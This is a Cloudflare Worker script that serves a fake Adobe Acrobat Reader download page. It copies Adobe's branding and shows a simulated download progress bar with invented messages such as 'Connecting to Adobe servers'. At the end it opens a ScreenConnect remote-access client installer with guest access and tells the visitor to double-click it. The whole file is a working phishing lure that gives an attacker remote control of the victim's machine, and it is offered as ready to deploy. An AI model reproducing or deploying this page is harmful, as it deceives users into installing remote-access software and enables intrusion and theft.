// ============================================================
//  CLOUDFLARE WORKER – ADOBE LANDING PAGE (UNENCRYPTED)
//  Fully readable, maintainable, and deployable
// ============================================================

export default {
  async fetch(request) {
    // ----- HTML PAGE WITH CLEAN JAVASCRIPT -----
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Adobe Acrobat Reader – Download</title>
  <style>
    /* ---------- RESET & BASE ---------- */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
      background: #f5f5f7;
      color: #1d1d1f;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
    }

    /* ---------- CARD CONTAINER ---------- */
    .card {
      max-width: 780px;
      width: 100%;
      background: #ffffff;
      border-radius: 20px;
      padding: 2.5rem 2.8rem 2.5rem;
      border: 1px solid #e8e8ed;
      box-shadow: 0 8px 40px rgba(0, 0, 0, 0.06);
      transition: box-shadow 0.3s ease;
      box-sizing: border-box;
    }

    .card:hover {
      box-shadow: 0 12px 56px rgba(0, 0, 0, 0.08);
    }

    /* ---------- HEADER ---------- */
    header {
      display: flex;
      align-items: center;
      border-bottom: 1px solid #ececf0;
      padding-bottom: 1.2rem;
      margin-bottom: 2rem;
    }

    .logo {
      font-size: 2.4rem;
      font-weight: 700;
      letter-spacing: -0.5px;
      color: #ea3c3c;
    }

    .logo-sub {
      font-weight: 300;
      font-size: 1rem;
      color: #6e6e73;
      margin-left: 0.4rem;
    }

    /* ---------- TITLE ---------- */
    .title {
      font-size: 1.8rem;
      font-weight: 600;
      letter-spacing: -0.3px;
      margin-bottom: 1.2rem;
      color: #1d1d1f;
      line-height: 1.3;
      margin-top: 0;
    }

    /* ---------- PDF BADGE ---------- */
    .badge-pdf {
      display: inline-block;
      background: #ea3c3c;
      color: #fff;
      font-weight: 700;
      font-size: 0.8rem;
      padding: 0.25rem 1.4rem;
      border-radius: 40px;
      letter-spacing: 0.6px;
      text-transform: uppercase;
      margin-bottom: 2rem;
      box-shadow: 0 2px 10px rgba(234, 60, 60, 0.25);
    }

    /* ---------- STEPS ---------- */
    .step {
      margin-bottom: 2rem;
    }

    .step-head {
      display: flex;
      align-items: center;
      gap: 0.7rem;
      font-weight: 600;
      font-size: 1.15rem;
      color: #1d1d1f;
    }

    .step-num {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      width: 30px;
      height: 30px;
      border-radius: 50%;
      background: #f0f0f5;
      color: #1d1d1f;
      font-size: 0.9rem;
      font-weight: 700;
      flex-shrink: 0;
    }

    .step-body {
      margin-top: 0.3rem;
      margin-left: 2.8rem;
      color: #3a3a3c;
      font-size: 0.95rem;
      line-height: 1.7;
    }

    .step-body code {
      background: #f4f4f7;
      padding: 0.1rem 0.6rem;
      border-radius: 6px;
      font-family: 'SF Mono', 'Cascadia Code', 'Consolas', monospace;
      font-size: 0.9rem;
      color: #1d1d1f;
    }

    .step-body strong {
      font-weight: 600;
      color: #1d1d1f;
    }

    /* ---------- DOWNLOAD BUTTON ---------- */
    .btn-download {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 0.8rem;
      background: #ea3c3c;
      color: #fff;
      border: none;
      padding: 0.85rem 2.8rem;
      border-radius: 60px;
      font-size: 1.05rem;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.25s ease, transform 0.15s ease, box-shadow 0.3s ease;
      box-shadow: 0 8px 24px rgba(234, 60, 60, 0.35);
      margin-top: 0.4rem;
      margin-left: 2.8rem;
      position: relative;
      overflow: hidden;
      letter-spacing: 0.2px;
    }

    .btn-download:hover {
      background: #d12b2b;
      transform: scale(1.02);
      box-shadow: 0 10px 32px rgba(234, 60, 60, 0.4);
    }

    .btn-download:active {
      transform: scale(0.96);
    }

    .btn-download:disabled {
      opacity: 0.7;
      cursor: not-allowed;
      transform: none;
    }

    .btn-download .icon {
      font-size: 1.3rem;
      transition: transform 0.3s ease;
    }

    .btn-download:not(:disabled):hover .icon {
      transform: translateY(-2px);
    }

    /* ---------- PROGRESS SECTION ---------- */
    .progress-wrap {
      margin: 1.8rem 0 0.2rem;
      margin-left: 2.8rem;
      background: #f8f8fb;
      border-radius: 14px;
      padding: 1.2rem 1.6rem;
      border: 1px solid #eaeaef;
      display: none;
      opacity: 0;
      transform: translateY(8px);
      transition: opacity 0.4s ease, transform 0.4s ease;
    }

    .progress-wrap.visible {
      display: block;
      opacity: 1;
      transform: translateY(0);
    }

    .progress-meta {
      display: flex;
      justify-content: space-between;
      align-items: center;
      font-weight: 500;
      font-size: 1rem;
      color: #1d1d1f;
      margin-bottom: 0.6rem;
    }

    .progress-meta .label {
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }

    .progress-meta .label .pulse {
      display: inline-block;
      width: 8px;
      height: 8px;
      border-radius: 50%;
      background: #ea3c3c;
      animation: pulse-dot 1.2s ease-in-out infinite;
    }

    .progress-meta .percent {
      font-weight: 700;
      color: #ea3c3c;
      font-variant-numeric: tabular-nums;
    }

    .progress-track {
      width: 100%;
      height: 8px;
      background: #e4e4ea;
      border-radius: 40px;
      overflow: hidden;
      position: relative;
    }

    .progress-fill {
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg, #ea3c3c, #ff6b6b);
      border-radius: 40px;
      transition: width 0.35s cubic-bezier(0.22, 1, 0.36, 1);
      position: relative;
    }

    .progress-fill::after {
      content: '';
      position: absolute;
      inset: 0;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
      animation: shimmer 2s infinite;
    }

    .progress-status {
      margin-top: 0.5rem;
      font-size: 0.85rem;
      color: #6e6e73;
      min-height: 1.4em;
      transition: color 0.3s ease;
    }

    .progress-status.done {
      color: #2d8a4e;
    }

    /* ---------- ANIMATIONS ---------- */
    @keyframes pulse-dot {
      0%, 100% { opacity: 0.3; transform: scale(0.8); }
      50% { opacity: 1; transform: scale(1.2); }
    }

    @keyframes shimmer {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(100%); }
    }

    /* ---------- RESPONSIVE ---------- */
    @media (max-width: 700px) {
      .card { padding: 1.8rem 1.5rem; }
      .title { font-size: 1.4rem; }
      .step-body { margin-left: 0; }
      .btn-download { margin-left: 0; width: 100%; padding: 0.9rem 1.5rem; }
      .progress-wrap { margin-left: 0; padding: 1rem 1.2rem; }
      .logo { font-size: 2rem; }
    }

    @media (max-width: 400px) {
      .card { padding: 1.2rem 1rem; }
      .title { font-size: 1.2rem; }
      .step-head { font-size: 1rem; }
      .step-num { width: 26px; height: 26px; font-size: 0.8rem; }
    }
  </style>
</head>
<body>

<div class="card">

  <!-- HEADER -->
  <header>
    <span class="logo">Adobe <span class="logo-sub">Acrobat</span></span>
  </header>

  <!-- TITLE -->
  <h1 class="title">Download and launch your Acrobat Reader software</h1>

  <!-- PDF BADGE -->
  <span class="badge-pdf">PDF</span>

  <!-- STEP 1: DOWNLOAD SOFTWARE -->
  <div class="step">
    <div class="step-head">
      <span class="step-num">1</span> Download software
    </div>
    <button class="btn-download" id="downloadBtn" type="button">
      <span class="icon">⬇</span>
      <span>Download installer</span>
    </button>
  </div>

  <!-- STEP 2: FINISH INSTALLATION -->
  <div class="step">
    <div class="step-head">
      <span class="step-num">2</span> Finish installation
    </div>
    <div class="step-body">
      Your download includes Acrobat Reader.<br />
      Open your <strong>Downloads</strong> folder and locate the Adobe Acrobat installer
      file.<br />
      Double‑click the installer file to complete the installation.
    </div>
  </div>

  <!-- PROGRESS SECTION -->
  <div class="progress-wrap" id="progressWrap">
    <div class="progress-meta">
      <span class="label">
        <span class="pulse"></span>
        <span id="progressLabel">Downloading...</span>
      </span>
      <span class="percent" id="percentDisplay">0%</span>
    </div>
    <div class="progress-track">
      <div class="progress-fill" id="progressFill" style="width: 0%;"></div>
    </div>
    <div class="progress-status" id="statusMsg">Initializing connection…</div>
  </div>

</div>

<script>
// ============================================================
//  CLEAN, UNENCRYPTED JAVASCRIPT
//  No obfuscation – fully readable and editable
// ============================================================

(function() {
  'use strict';

  // ----- DOM REFERENCES -----
  const downloadBtn = document.getElementById('downloadBtn');
  const progressWrap = document.getElementById('progressWrap');
  const progressFill = document.getElementById('progressFill');
  const percentDisplay = document.getElementById('percentDisplay');
  const progressLabel = document.getElementById('progressLabel');
  const statusMsg = document.getElementById('statusMsg');

  // ----- CONFIGURATION -----
  // CHANGE THIS URL TO YOUR ACTUAL DOWNLOAD LINK
  const DOWNLOAD_URL = 'https://instmail28.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest';

  // ----- STATUS MESSAGES -----
  const STATUSES = [
    { threshold: 0, msg: 'Initializing connection…' },
    { threshold: 10, msg: 'Connecting to Adobe servers…' },
    { threshold: 25, msg: 'Downloading package…' },
    { threshold: 45, msg: 'Downloading package…' },
    { threshold: 65, msg: 'Almost there…' },
    { threshold: 85, msg: 'Finalizing…' },
    { threshold: 100, msg: 'Download complete!' }
  ];

  function getStatus(progress) {
    let found = STATUSES[0];
    for (const s of STATUSES) {
      if (progress >= s.threshold) found = s;
    }
    return found.msg;
  }

  // ----- STATE -----
  let isRunning = false;
  let timer = null;

  // ----- DOWNLOAD FUNCTION -----
  function startDownload() {
    if (isRunning) return;
    isRunning = true;

    // Show progress section
    progressWrap.classList.add('visible');

    // Reset progress
    progressFill.style.width = '0%';
    percentDisplay.textContent = '0%';
    progressLabel.textContent = 'Downloading…';
    statusMsg.textContent = 'Initializing connection…';
    statusMsg.className = 'progress-status';

    // Disable button and change icon
    downloadBtn.disabled = true;
    downloadBtn.querySelector('.icon').textContent = '⟳';

    let progress = 0;

    if (timer) clearInterval(timer);

    timer = setInterval(() => {
      // Increment progress by random amount (3–8%)
      const step = Math.floor(Math.random() * 6) + 3;
      progress = Math.min(progress + step, 100);

      // Update UI
      progressFill.style.width = progress + '%';
      percentDisplay.textContent = progress + '%';
      statusMsg.textContent = getStatus(progress);

      // When complete
      if (progress === 100) {
        clearInterval(timer);
        timer = null;
        isRunning = false;

        progressLabel.textContent = '✓ Done';
        statusMsg.className = 'progress-status done';

        // Re-enable button
        downloadBtn.disabled = false;
        downloadBtn.querySelector('.icon').textContent = '✓';
        downloadBtn.querySelector('span:last-child').textContent = 'Downloaded';

        // Open download URL in new tab
        window.open(DOWNLOAD_URL, '_blank');
      }
    }, 180);
  }

  // ----- EVENT LISTENERS -----
  downloadBtn.addEventListener('click', startDownload);

  // Ripple effect on button (mouse move)
  downloadBtn.addEventListener('mousemove', function(e) {
    const rect = this.getBoundingClientRect();
    const x = ((e.clientX - rect.left) / rect.width) * 100;
    const y = ((e.clientY - rect.top) / rect.height) * 100;
    this.style.setProperty('--x', x + '%');
    this.style.setProperty('--y', y + '%');

    // Create ripple element if it doesn't exist
    if (!this._ripple) {
      const ripple = document.createElement('span');
      ripple.style.position = 'absolute';
      ripple.style.inset = '0';
      ripple.style.background = 'radial-gradient(circle at var(--x, 50%) var(--y, 50%), rgba(255,255,255,0.25), transparent 60%)';
      ripple.style.opacity = '0';
      ripple.style.transition = 'opacity 0.4s ease';
      ripple.style.pointerEvents = 'none';
      ripple.style.borderRadius = 'inherit';
      this.appendChild(ripple);
      this._ripple = ripple;
    }
    this._ripple.style.opacity = '1';
  });

  downloadBtn.addEventListener('mouseleave', function() {
    if (this._ripple) this._ripple.style.opacity = '0';
  });

})();
</script>

</body>
</html>`;

    // ----- Return the HTML with proper headers -----
    return new Response(html, {
      headers: {
        'Content-Type': 'text/html;charset=UTF-8',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
      }
    });
  }
};